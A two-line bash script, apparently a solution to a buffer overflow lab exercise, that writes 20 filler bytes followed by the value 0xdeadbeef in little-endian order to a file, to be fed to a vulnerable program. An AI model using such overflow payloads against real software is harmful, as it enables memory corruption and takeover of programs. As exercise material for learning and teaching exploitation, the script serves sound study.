#!/bin/bash
python -c 'print("A"*20+"\xef\xbe\xad\xde\n")' > $1
